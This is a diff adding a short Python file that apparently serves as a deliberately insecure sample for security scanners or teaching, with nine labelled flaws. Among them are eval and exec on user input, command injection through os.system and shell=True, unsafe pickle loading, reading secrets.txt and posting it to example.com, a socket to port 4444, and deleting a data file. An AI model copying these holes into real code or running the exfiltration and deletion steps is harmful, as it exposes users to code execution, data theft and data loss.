@@ -1,0 +1,43 @@
+import os
+import subprocess
+import pickle
+import socket
+import requests
+
+# 1. Hardcoded credentials
+USERNAME = "admin"
+PASSWORD = "SuperSecret123"
+
+# 2. Arbitrary code execution
+user_input = input("Enter Python code: ")
+eval(user_input)
+exec(user_input)
+
+# 3. Command injection
+command = input("Enter command: ")
+os.system(command)
+
+# 4. Unsafe subprocess execution
+filename = input("Enter filename: ")
+subprocess.call("cat " + filename, shell=True)
+
+# 5. Unsafe deserialization
+with open("user_data.pkl", "rb") as file:
+    data = pickle.load(file)
+
+# 6. Sensitive file access
+with open("secrets.txt", "r") as file:
+    secret_data = file.read()
+
+# 7. Potential data exfiltration
+requests.post(
+    "https://example.com/upload",
+    data=secret_data
+)
+
+# 8. Network connection
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("example.com", 4444))
+
+# 9. Destructive file operation
+os.remove("important_data.txt")
